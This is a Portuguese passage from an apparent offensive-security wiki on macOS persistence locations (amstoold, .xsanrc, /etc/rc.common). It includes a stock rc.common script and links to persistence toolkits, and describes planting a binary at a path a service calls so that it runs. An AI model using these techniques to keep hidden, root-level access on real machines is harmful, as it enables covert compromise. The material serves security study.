kextunload -b com.apple.driver.ExampleBundle
```
Para mais informações sobre [**extensões de kernel, ver esta seção**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Escrita: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Localização

- **`/usr/local/bin/amstoold`**
- Root necessário

#### Descrição & Exploração

Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando este binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você poderia colocar algo lá e, quando o serviço XPC fosse chamado, seu binário seria chamado.

Não consigo mais encontrar isso no meu macOS.

### ~~xsanctl~~

Escrita: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Localização

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root necessário
- **Gatilho**: Quando o serviço é executado (raramente)

#### Descrição & exploração

Aparentemente, não é muito comum executar este script e eu não consegui encontrá-lo no meu macOS, então se você quiser mais informações, verifique a escrita.

### ~~/etc/rc.common~~

> [!CAUTION] > **Isso não está funcionando nas versões modernas do MacOS**

Também é possível colocar aqui **comandos que serão executados na inicialização.** Exemplo de script rc.common regular:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Técnicas e ferramentas de persistência

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
